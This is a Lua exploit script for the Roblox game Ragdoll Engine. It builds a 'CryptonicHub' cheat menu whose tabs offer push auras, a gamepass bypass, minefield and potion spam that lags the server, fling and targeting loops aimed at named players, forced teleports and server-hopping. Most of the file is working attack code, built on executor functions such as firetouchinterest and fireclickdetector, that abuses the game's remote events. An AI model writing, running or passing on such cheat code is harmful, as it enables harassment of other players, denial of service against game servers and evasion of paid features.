					(math.clamp(ColorSelection.AbsolutePosition.X - Color.AbsolutePosition.X, 0, Color.AbsoluteSize.X) /
						Color.AbsoluteSize.X)
				ColorV =
					1 -
					(math.clamp(ColorSelection.AbsolutePosition.Y - Color.AbsolutePosition.Y, 0, Color.AbsoluteSize.Y) /
						Color.AbsoluteSize.Y)

				BoxColor.BackgroundColor3 = preset
				Color.BackgroundColor3 = preset
				pcall(callback, BoxColor.BackgroundColor3)

				Color.InputBegan:Connect(
					function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							if RainbowColorPicker then
								return
							end

							if ColorInput then
								ColorInput:Disconnect()
							end

							ColorInput =
								RunService.RenderStepped:Connect(
									function()
									local ColorX =
										(math.clamp(Mouse.X - Color.AbsolutePosition.X, 0, Color.AbsoluteSize.X) /
											Color.AbsoluteSize.X)
									local ColorY =
										(math.clamp(Mouse.Y - Color.AbsolutePosition.Y, 0, Color.AbsoluteSize.Y) /
											Color.AbsoluteSize.Y)

									ColorSelection.Position = UDim2.new(ColorX, 0, ColorY, 0)
									ColorS = ColorX
									ColorV = 1 - ColorY

									UpdateColorPicker(true)
								end
								)
						end
					end
				)

				Color.InputEnded:Connect(
					function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							if ColorInput then
								ColorInput:Disconnect()
							end
						end
					end
				)

				Hue.InputBegan:Connect(
					function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							if RainbowColorPicker then
								return
							end

							if HueInput then
								HueInput:Disconnect()
							end

							HueInput =
								RunService.RenderStepped:Connect(
									function()
									local HueY =
										(math.clamp(Mouse.Y - Hue.AbsolutePosition.Y, 0, Hue.AbsoluteSize.Y) /
											Hue.AbsoluteSize.Y)

									HueSelection.Position = UDim2.new(0.48, 0, HueY, 0)
									ColorH = 1 - HueY

									UpdateColorPicker(true)
								end
								)
						end
					end
				)

				Hue.InputEnded:Connect(
					function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							if HueInput then
								HueInput:Disconnect()
							end
						end
					end
				)

				RainbowToggle.MouseButton1Down:Connect(
					function()
						RainbowColorPicker = not RainbowColorPicker

						if ColorInput then
							ColorInput:Disconnect()
						end

						if HueInput then
							HueInput:Disconnect()
						end

						if RainbowColorPicker then
							TweenService:Create(
								FrameRainbowToggle1,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{BackgroundTransparency = 1}
							):Play()
							TweenService:Create(
								FrameRainbowToggle2,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{BackgroundTransparency = 1}
							):Play()
							TweenService:Create(
								FrameRainbowToggle3,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{BackgroundTransparency = 0}
							):Play()
							TweenService:Create(
								FrameRainbowToggleCircle,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{BackgroundColor3 = Color3.fromRGB(255, 255, 255)}
							):Play()
							FrameRainbowToggleCircle:TweenPosition(
								UDim2.new(0.587, 0, 0.222000003, 0),
								Enum.EasingDirection.Out,
								Enum.EasingStyle.Quart,
								.2,
								true
							)

							OldToggleColor = BoxColor.BackgroundColor3
							OldColor = Color.BackgroundColor3
							OldColorSelectionPosition = ColorSelection.Position
							OldHueSelectionPosition = HueSelection.Position

							while RainbowColorPicker do
								BoxColor.BackgroundColor3 = Color3.fromHSV(lib.RainbowColorValue, 1, 1)
								Color.BackgroundColor3 = Color3.fromHSV(lib.RainbowColorValue, 1, 1)

								ColorSelection.Position = UDim2.new(1, 0, 0, 0)
								HueSelection.Position = UDim2.new(0.48, 0, 0, lib.HueSelectionPosition)

								pcall(callback, BoxColor.BackgroundColor3)
								wait()
							end
						elseif not RainbowColorPicker then
							TweenService:Create(
								FrameRainbowToggle1,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{BackgroundTransparency = 0}
							):Play()
							TweenService:Create(
								FrameRainbowToggle2,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{BackgroundTransparency = 0}
							):Play()
							TweenService:Create(
								FrameRainbowToggle3,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{BackgroundTransparency = 1}
							):Play()
							TweenService:Create(
								FrameRainbowToggleCircle,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{BackgroundColor3 = Color3.fromRGB(50, 50, 50)}
							):Play()
							FrameRainbowToggleCircle:TweenPosition(
								UDim2.new(0.127000004, 0, 0.222000003, 0),
								Enum.EasingDirection.Out,
								Enum.EasingStyle.Quart,
								.2,
								true
							)

							BoxColor.BackgroundColor3 = OldToggleColor
							Color.BackgroundColor3 = OldColor

							ColorSelection.Position = OldColorSelectionPosition
							HueSelection.Position = OldHueSelectionPosition

							pcall(callback, BoxColor.BackgroundColor3)
						end
					end
				)

				ConfirmBtn.MouseButton1Click:Connect(
					function()
						ColorSelection.Visible = false
						HueSelection.Visible = false
						Colorpicker:TweenSize(
							UDim2.new(0, 363, 0, 42),
							Enum.EasingDirection.Out,
							Enum.EasingStyle.Quart,
							.2,
							true
						)
						wait(.2)
						Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
					end
				)
				Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
			end
			function tabcontent:Label(text)
				local Label = Instance.new("TextButton")
				local LabelCorner = Instance.new("UICorner")
				local LabelTitle = Instance.new("TextLabel")

				Label.Name = "Button"
				Label.Parent = Tab
				Label.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
				Label.Size = UDim2.new(0, 363, 0, 42)
				Label.AutoButtonColor = false
				Label.Font = Enum.Font.SourceSans
				Label.Text = ""
				Label.TextColor3 = Color3.fromRGB(0, 0, 0)
				Label.TextSize = 14.000

				LabelCorner.CornerRadius = UDim.new(0, 5)
				LabelCorner.Name = "ButtonCorner"
				LabelCorner.Parent = Label

				LabelTitle.Name = "ButtonTitle"
				LabelTitle.Parent = Label
				LabelTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				LabelTitle.BackgroundTransparency = 1.000
				LabelTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
				LabelTitle.Size = UDim2.new(0, 187, 0, 42)
				LabelTitle.Font = Enum.Font.Gotham
				LabelTitle.Text = text
				LabelTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
				LabelTitle.TextSize = 14.000
				LabelTitle.TextXAlignment = Enum.TextXAlignment.Left

				Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)

				return LabelTitle
			end
			function tabcontent:Textbox(text, disapper, callback)
				local Textbox = Instance.new("Frame")
				local TextboxCorner = Instance.new("UICorner")
				local TextboxTitle = Instance.new("TextLabel")
				local TextboxFrame = Instance.new("Frame")
				local TextboxFrameCorner = Instance.new("UICorner")
				local TextBox = Instance.new("TextBox")

				Textbox.Name = "Textbox"
				Textbox.Parent = Tab
				Textbox.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
				Textbox.ClipsDescendants = true
				Textbox.Position = UDim2.new(-0.541071415, 0, -0.532915354, 0)
				Textbox.Size = UDim2.new(0, 363, 0, 42)

				TextboxCorner.CornerRadius = UDim.new(0, 5)
				TextboxCorner.Name = "TextboxCorner"
				TextboxCorner.Parent = Textbox

				TextboxTitle.Name = "TextboxTitle"
				TextboxTitle.Parent = Textbox
				TextboxTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				TextboxTitle.BackgroundTransparency = 1.000
				TextboxTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
				TextboxTitle.Size = UDim2.new(0, 187, 0, 42)
				TextboxTitle.Font = Enum.Font.Gotham
				TextboxTitle.Text = text
				TextboxTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
				TextboxTitle.TextSize = 14.000
				TextboxTitle.TextXAlignment = Enum.TextXAlignment.Left

				TextboxFrame.Name = "TextboxFrame"
				TextboxFrame.Parent = TextboxTitle
				TextboxFrame.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
				TextboxFrame.Position = UDim2.new(1.28877008, 0, 0.214285716, 0)
				TextboxFrame.Size = UDim2.new(0, 100, 0, 23)

				TextboxFrameCorner.CornerRadius = UDim.new(0, 5)
				TextboxFrameCorner.Name = "TextboxFrameCorner"
				TextboxFrameCorner.Parent = TextboxFrame

				TextBox.Parent = TextboxFrame
				TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				TextBox.BackgroundTransparency = 1.000
				TextBox.Size = UDim2.new(0, 100, 0, 23)
				TextBox.Font = Enum.Font.Gotham
				TextBox.Text = ""
				TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
				TextBox.TextSize = 14.000

				TextBox.FocusLost:Connect(
					function(ep)
						if ep then
							if #TextBox.Text > 0 then
								pcall(callback, TextBox.Text)
								if disapper then
									TextBox.Text = ""
								end
							end
						end
					end
				)
				Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
			end
			function tabcontent:Bind(text, keypreset, callback)
				local binding = false
				local Key = keypreset.Name
				local Bind = Instance.new("TextButton")
				local BindCorner = Instance.new("UICorner")
				local BindTitle = Instance.new("TextLabel")
				local BindText = Instance.new("TextLabel")

				Bind.Name = "Bind"
				Bind.Parent = Tab
				Bind.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
				Bind.Size = UDim2.new(0, 363, 0, 42)
				Bind.AutoButtonColor = false
				Bind.Font = Enum.Font.SourceSans
				Bind.Text = ""
				Bind.TextColor3 = Color3.fromRGB(0, 0, 0)
				Bind.TextSize = 14.000

				BindCorner.CornerRadius = UDim.new(0, 5)
				BindCorner.Name = "BindCorner"
				BindCorner.Parent = Bind

				BindTitle.Name = "BindTitle"
				BindTitle.Parent = Bind
				BindTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				BindTitle.BackgroundTransparency = 1.000
				BindTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
				BindTitle.Size = UDim2.new(0, 187, 0, 42)
				BindTitle.Font = Enum.Font.Gotham
				BindTitle.Text = text
				BindTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
				BindTitle.TextSize = 14.000
				BindTitle.TextXAlignment = Enum.TextXAlignment.Left

				BindText.Name = "BindText"
				BindText.Parent = Bind
				BindText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				BindText.BackgroundTransparency = 1.000
				BindText.Position = UDim2.new(0.0358126722, 0, 0, 0)
				BindText.Size = UDim2.new(0, 337, 0, 42)
				BindText.Font = Enum.Font.Gotham
				BindText.Text = Key
				BindText.TextColor3 = Color3.fromRGB(255, 255, 255)
				BindText.TextSize = 14.000
				BindText.TextXAlignment = Enum.TextXAlignment.Right

				Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)

				Bind.MouseButton1Click:Connect(
					function()
						BindText.Text = "..."
						binding = true
						local inputwait = game:GetService("UserInputService").InputBegan:wait()
						if inputwait.KeyCode.Name ~= "Unknown" then
							BindText.Text = inputwait.KeyCode.Name
							Key = inputwait.KeyCode.Name
							binding = false
						else
							binding = false
						end
					end
				)

				game:GetService("UserInputService").InputBegan:connect(
				function(current, pressed)
					if not pressed then
						if current.KeyCode.Name == Key and binding == false then
							pcall(callback)
						end
					end
				end
				)
			end
			return tabcontent
		end
		return tabhold
	end
	return lib
end

-- ***********************************************************************************************************
--
--
--
--
--              GETTING LIB & WINDOW
--
--
--
--
--
-- ***********************************************************************************************************

local lib = getLib()

local win = lib:Window("CryptonicHub", Color3.fromRGB(255, 85, 0), Enum.KeyCode.P)

-- ***********************************************************************************************************
--
--
--
--
--              HOME TAB
--
--
--
--
--
-- ***********************************************************************************************************

local homeTab = win:Tab("Home")

homeTab:Label("Press [P] to open/close the Hub")
homeTab:Label("Game: Ragdoll Engine")
homeTab:Label("Player: "..game:GetService("Players").LocalPlayer.DisplayName.." | (@"..game:GetService("Players").LocalPlayer.Name..")")

local RunService = game:GetService("RunService")
local FpsLabel = homeTab:Label("FPS: ")
homeTab:Button("Check Players using the Script", function()
if #activePlrs == 0 then
lib:Notification("Information","There's no players running the script on the server.", "Okay!")
else
lib:Notification("Players", table.concat(activePlrs,"\n"), "Okay!")
end
	
end)
homeTab:Button("Discord Invite", function()
	lib:Notification("Notification", "Invite copied to clipboard. If it didn't work, you can use this one: .gg/GR3VpghShk", "Okay!")
	setclipboard("https://discord.gg/".. invite)
end)

local TimeFunction = RunService:IsRunning() and time or os.clock

local LastIteration, Start
local FrameUpdateTable = {}

local function HeartbeatUpdate()
	LastIteration = TimeFunction()
	for Index = #FrameUpdateTable, 1, -1 do
		FrameUpdateTable[Index + 1] = FrameUpdateTable[Index] >= LastIteration - 1 and FrameUpdateTable[Index] or nil
	end

	FrameUpdateTable[1] = LastIteration
	FpsLabel.Text = "FPS: " .. tostring(math.floor(TimeFunction() - Start >= 1 and #FrameUpdateTable or #FrameUpdateTable / (TimeFunction() - Start)))
end

Start = TimeFunction()
RunService.Heartbeat:Connect(HeartbeatUpdate)

-- ***********************************************************************************************************
--
--
--
--
--              SCRIPTS TAB
--
--
--
--
--
-- ***********************************************************************************************************

local scriptsTab = win:Tab("Scripts")

scriptsTab:Textbox("Whitelist Player [Add / Remove]", false, function(val)

for _,plr in ipairs(game:GetService("Players"):GetPlayers()) do
	if string.lower(plr.Name) == tostring(getPlayerByShortName(val)) then
		WLplr = plr.Name
	end
end

if not table.find(whitelistPlrs, WLplr) and WLplr then
	table.insert(whitelistPlrs, WLplr)
elseif table.find(whitelistPlrs, WLplr) then
    for i=1,#whitelistPlrs do
	if whitelistPlrs[i]==WLplr then
	table.remove(whitelistPlrs,i)
	end
	end
end

lib:Notification("Whitelist", table.concat(whitelistPlrs,"\n"), "Okay!")

end)

scriptsTab:Toggle("Push Aura", false, function(value)

	if value == true then
		pushauraLoop = game:GetService'RunService'.Stepped:Connect(function()
			pcall(function()
				game:GetService'Players'.LocalPlayer.Backpack:FindFirstChild('Push').Parent = game.Players.LocalPlayer.Character
			end)
			for i, plr in ipairs(game:GetService("Players"):GetPlayers()) do
				if plr ~= game:GetService'Players'.LocalPlayer and not table.find(whitelistPlrs, plr.Name) then
					local character = plr.Character or plr.CharacterAdded:Wait()
					local hrp = character.HumanoidRootPart
					if (game:GetService'Players'.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position - hrp.Position).Magnitude < 10 then
						pcall(function()
							game:GetService'Players'.LocalPlayer.Character:FindFirstChild('Push'):FindFirstChild('PushTool'):FireServer(plr.Character)
						end)
					end
				end
			end
		end)
	elseif value == false then
		pushauraLoop:Disconnect()
	end

end)

scriptsTab:Toggle("Push Aura [Without Gamepass]", false, function(value)

	if value == true then
		for _,v in ipairs(workspace:GetDescendants()) do
			if v.Name == "Push" then
				toolToUse = v
			end
		end
		freepushauraLoop = game:GetService'RunService'.Stepped:Connect(function()
			for i, plr in ipairs(game:GetService("Players"):GetPlayers()) do
				if plr ~= game:GetService'Players'.LocalPlayer and not table.find(whitelistPlrs, plr.Name) then
					local character = plr.Character or plr.CharacterAdded:Wait()
					local hrp = character.HumanoidRootPart
					if (game:GetService'Players'.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position - hrp.Position).Magnitude < 10 then
						pcall(function()
							toolToUse:FindFirstChild('PushTool'):FireServer(plr.Character)
						end)
					end
				end
			end
		end)
	elseif value == false then
		freepushauraLoop:Disconnect()
	end

end)



local isMTLoaded = false
scriptsTab:Toggle("Anti Ragdoll / Push", false, function(value)

	if value == true then
		game.Players.LocalPlayer.Character.HumanoidRootPart.ChildAdded:Connect(function(obj)
			if obj:IsA("BodyVelocity") and value == true then
				obj.P = 0
				obj.MaxForce = Vector3.new(0,0,0)
				obj.Velocity = Vector3.new(0,0,0)
			end
		end)
		for i,script in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
			if script.Name == "StartRagdoll" or script.Name == "Pushed" or script.Name == "RagdollMe" or script.Name == "KillScript" or script.Name == "Falling down" or script.Name == "Swimming" then
				script.Disabled = true
			end
		end
	elseif value == false then
		for i,script in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
			if script.Name == "StartRagdoll" or script.Name == "Pushed" or script.Name == "RagdollMe" or script.Name == "KillScript" or script.Name == "Falling down" or script.Name == "Swimming" then
				script.Disabled = false
			end
		end
	end

end)

function getRoot(char)
	local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
	return rootPart
end

function respawn(plr)
	local char = plr.Character
	if char:FindFirstChildOfClass("Humanoid") then char:FindFirstChildOfClass("Humanoid"):ChangeState(15) end
	char:ClearAllChildren()
	local newChar = Instance.new("Model")
	newChar.Parent = workspace
	plr.Character = newChar
	wait()
	plr.Character = char
	newChar:Destroy()
end

local refreshCmd = false
function refresh(plr)
	refreshCmd = true
	local Human = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid", true)
	local pos = Human and Human.RootPart and Human.RootPart.CFrame
	local pos1 = workspace.CurrentCamera.CFrame
	respawn(plr)
	task.spawn(function()
		plr.CharacterAdded:Wait():WaitForChild("Humanoid").RootPart.CFrame, workspace.CurrentCamera.CFrame = pos, wait() and pos1
		refreshCmd = false
	end)
end

local isMineActive = false

local func = coroutine.wrap(function()

game:GetService("RunService").RenderStepped:connect(function()
   if isMineActive == false then return end
for _,mine in pairs(game:GetService("Workspace").NewerMap.Obstacles.Minefield.Mines:GetDescendants()) do
    if mine.Name == "Part" and mine:FindFirstChild("TouchInterest") then
        firetouchinterest(game:GetService("Players").LocalPlayer.Character.Head, mine, 1)
        firetouchinterest(game:GetService("Players").LocalPlayer.Character.Head, mine, 0)
    end
end
end)
end)

func()


scriptsTab:Toggle("Spam Minefield [Lags the server a lil']", false, function(value)

if value and isMineActive == false then
    isMineActive = true
	lib:Notification("Warning", "This might not work on some exploits due of the firetouchinterest function", "Okay!")
elseif value == false and isMineActive then
	isMineActive = false
end

end)

local dbounce = false
scriptsTab:Button("Break all Cannons [Once per Server]", function()
	if dbounce then return end
	dbounce = true
	for _,cd in pairs(workspace:GetDescendants()) do
    	if cd.Name == "ClickDetector" then
        	fireclickdetector(cd)
    	end
	end

	refresh(game:GetService("Players").LocalPlayer)
	lib:Notification("Information", "Execute more than once if the cannons are still working", "Okay!")
	wait()
	dbounce = false
end)

scriptsTab:Button("Permanent Potion Effect [Drink the potion first]", function()
	pcall(function()
		game:GetService("Players").LocalPlayer.Backpack:WaitForChild("potion").Parent = game:GetService("Players").LocalPlayer.Character
	end)

	local tool = game:GetService("Players").LocalPlayer.Character:WaitForChild("potion")
	for i,v in pairs(tool:GetDescendants()) do
		if v:IsA("Script") then
			v:Destroy()
		end
	end

	lib:Notification("Information", "To disable this, you must reset your character.", "Understood.")
end)


scriptsTab:Button("Dick Potion", function()
	pcall(function()
		game:GetService("Players").LocalPlayer.Backpack:WaitForChild("potion").Parent = game:GetService("Players").LocalPlayer.Character
	end)

	local plr = game:GetService("Players").LocalPlayer
	local potion = workspace[plr.Name]:WaitForChild("potion")

	potion.Grip = CFrame.new(1.7, 0.5, -1, 0.01, 50, 0.1, 0, 1, 0, -0.5, 0, 0.2)

	lib:Notification("Information", "To disable this, you must reset your character.", "Understood.")
end)

scriptsTab:Button("Potion Lag [do not abuse, they can kick you]", function()
	
local LP = game:GetService('Players').LocalPlayer
local LC = LP.Character
local LB = LP.Backpack
local Hum = LC:FindFirstChildOfClass('Humanoid')
local Tool = nil

if not Hum then
    return
end

Hum:UnequipTools()

for _, v in next, LB:GetChildren() do
    if v:IsA('Tool') and v:FindFirstChild('Handle') then
        Tool = v
        break
    end
end

if not Tool then
    return
end

Tool.Parent = LB
Tool.Grip = CFrame.new(0/0, 0/0, 0/0)
for i = 1, 10000 do
    Tool.Parent = LC
    Tool.Parent = LB
end

	lib:Notification("Information", "do not abuse!!!!!!!!!!!!!.", "ok.")
end)

scriptsTab:Button("Potion Fling [push fling, but need potion gamepass]", function()
--[[
 FlingTool
]]
pcall(function()
game:GetService("Players").LocalPlayer.Backpack:WaitForChild("potion").Parent = game:GetService("Players").LocalPlayer.Character
end)

local player = game.Players.LocalPlayer
local character = player.Character
local toolEquip = character:FindFirstChildOfClass("Tool")
toolEquip.Name = "potion"
toolEquip.GripPos = Vector3.new(5000, 5000, 5000)
toolEquip.Parent = player.Backpack
toolEquip.Handle.Massless = true
toolEquip.Cap:Destroy()
toolEquip.InSide:Destroy()
player.Character.HumanoidRootPart.CustomPhysicalProperties = PhysicalProperties.new(math.huge,math.huge,math.huge,math.huge,math.huge)
wait(0.1)
local toolstored = player.Backpack:FindFirstChild("potion")
toolstored.Parent = character

	lib:Notification("Information", "for best experience, please run anti ragdoll first.", "Ok.")
end)


scriptsTab:Button("Turn Invisible", function()
	local oldCframe = game:GetService'Players'.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
	game:GetService'Players'.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(0,99999999999999,0)
	wait(.1)
	game:GetService'Players'.LocalPlayer.Character:WaitForChild("Head").Anchored = true
	game:GetService'Players'.LocalPlayer.Character:WaitForChild("HumanoidRootPart").Anchored = true
	wait(.75)
	game:GetService'Players'.LocalPlayer.Character:BreakJoints()
	game:GetService'Players'.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldCframe
	wait(3)
	game:GetService'Players'.LocalPlayer.Character:WaitForChild("HumanoidRootPart").Anchored = false
end)


-- ***********************************************************************************************************
--
--
--
--
--              TARGET TAB
--
--
--
--
--
-- ***********************************************************************************************************

local targetTab = win:Tab("Target")

isTargetActive = false

targetTab:Textbox("Target [Short / Full Username]", false, function(val)

	for _,plr in ipairs(game:GetService("Players"):GetPlayers()) do
		if string.lower(plr.Name) == tostring(getPlayerByShortName(val)) then
			target = plr.Name
		end
	end

	if isTargetActive == false then
		isTargetActive = true
		pcall(function()
			game:GetService'Players'.LocalPlayer.Backpack:WaitForChild('Push').Parent = game:GetService'Players'.LocalPlayer.Character
		end)
		targetLoop = game:GetService'RunService'.Stepped:Connect(function()
			game:GetService'Players'.LocalPlayer.Character:FindFirstChild('Push'):WaitForChild('PushTool'):FireServer(game:GetService("Workspace")[target])

			game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[target].Character.HumanoidRootPart.CFrame * CFrame.new(0,0,0.1)
		end)
	elseif isTargetActive == true then
		lib:Notification("Warning", "Please, press the untarget button before targetting someone else.", "Okay!")
		return
	end
end)

targetTab:Textbox("Target [Without Gamepass]", false, function(val)

	for _,plr in ipairs(game:GetService("Players"):GetPlayers()) do
		if string.lower(plr.Name) == tostring(getPlayerByShortName(val)) then
			target = plr.Name
		end
	end

	if isTargetActive == false then
		isTargetActive = true

		for _,v in ipairs(workspace:GetDescendants()) do
			if v.Name == "Push" then
				toolToUse = v
			end
		end

		targetLoop = game:GetService'RunService'.Stepped:Connect(function()

			toolToUse:FindFirstChild("PushTool"):FireServer(game:GetService("Workspace")[target])

			game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[target].Character.HumanoidRootPart.CFrame * CFrame.new(0,0,0.1)
		end)
	elseif isTargetActive == true then
		lib:Notification("Warning", "Please, press the untarget button before targetting someone else.", "Okay!")
		return
	end
end)

local RS = game:GetService('RunService').RenderStepped
targetTab:Textbox("Give Potion [Short / Full Username]", false, function(val)
for _,plr in ipairs(game:GetService("Players"):GetPlayers()) do
	if string.lower(plr.Name) == tostring(getPlayerByShortName(val)) then
		potionTarget = plr.Name
	end
end

local Players = game:GetService("Players")
local lplr = Players.LocalPlayer

lplr.Backpack.potion.Parent = lplr.Character
wait(.05)
local v = potionTarget

local Char = lplr.Character or workspace:FindFirstChild(lplr.Name)
local hum = Char and Char:FindFirstChildWhichIsA('Humanoid')
local hrp = hum and hum.RootPart
local hrppos = hrp.CFrame
hum = hum:Destroy() or hum:Clone()
hum.Parent = Char
hum:ClearAllChildren()
lplr:ClearCharacterAppearance()

coroutine.wrap(function()
	lplr.CharacterAdded:Wait():WaitForChild('Humanoid').RootPart.CFrame = wait() and hrppos
end)()

local vHRP = getRoot(Players[v].Character)

while Char and Char.Parent and vHRP and vHRP.Parent do
	local Tools = false
	for _, v in ipairs(Char:GetChildren()) do
		if v:IsA('BackpackItem') and v:FindFirstChild('Handle') then
			Tools = true
			firetouchinterest(v.Handle, vHRP, 0)
			firetouchinterest(v.Handle, vHRP, 1)
		end
	end
	if not Tools then
		break
	end
	hrp.CFrame = vHRP.CFrame
	RS:Wait()
end

refresh(lplr)
end)

targetTab:Button("Untarget Player", function()
	isTargetActive = false
	targetLoop:Disconnect()
end)

-- ***********************************************************************************************************
--
--
--
--
--              TPS TAB
--
--
--
--
--
-- ***********************************************************************************************************

local tpTab = win:Tab("Teleport")

tpTab:Textbox("TP to Player", true, function(val)
	for _,plr in ipairs(game:GetService("Players"):GetPlayers()) do
		if string.lower(plr.Name) == tostring(getPlayerByShortName(val)) then
			target = plr.Name
		end
	end
	game:GetService'Players'.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game:GetService'Players'[target].Character:WaitForChild("HumanoidRootPart").CFrame
end)

tpTab:Button("Minefield", function()
	game:GetService'Players'.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-33,25,-152)
end)

tpTab:Button("Balloon", function()
	game:GetService'Players'.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-114,25,-131)
end)

tpTab:Button("Moving Stairs", function()
	game:GetService'Players'.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-214,89,-223)
end)

tpTab:Button("Normal Stairs", function()
	game:GetService'Players'.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-6,205,-497)
end)

tpTab:Button("Spiral Stairs", function()
	game:GetService'Players'.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(114,832,-333)
end)

tpTab:Button("Big Ass Building", function()
	game:GetService'Players'.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(141,1032,-192)
end)

-- ***********************************************************************************************************
--
--
--
--
--              MISC TAB
--
--
--
--
--
-- ***********************************************************************************************************

local miscTab = win:Tab("Misc")

miscTab:Button("JobId: "..game.JobId, function(val)
	setclipboard(game.JobId)
	lib:Notification("Information", "Share this to let other people using the hub join your server", "Cool!")
end)

miscTab:Textbox("JobId Teleport", false, function(val)
	game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, val, game.Players.LocalPlayer)
end)

miscTab:Colorpicker("Change UI Color",Color3.fromRGB(255, 85, 0), function(t)
	lib:ChangePresetColor(Color3.fromRGB(t.R * 255, t.G * 255, t.B * 255))
end)



-- ***********************************************************************************************************
--
--
--
--
--              CREDITS TAB
--
--
--
--
--
-- ***********************************************************************************************************


local creditsTab = win:Tab("Credits")

creditsTab:Label("Credits [Click their names to copy their Discord]")

creditsTab:Button("MA4RTIlN              (martiin#0015)", function()
    setclipboard("martiin#0015")
	lib:Notification("MA4RTIlN", "Scripting, original idea", "Cool!")
end)

creditsTab:Button("unhabilitated        (wmv#7622)", function()
    setclipboard("wmv#7622")
	lib:Notification("unhabilitated", "Scripting, UI design", "Cool!")
end)

creditsTab:Button("onlinesociopath   (demvkrao#0069)", function()
    setclipboard("demvkrao#0069")
	lib:Notification("onlinesociopath", "Scripting, UI design", "Cool!")
end)
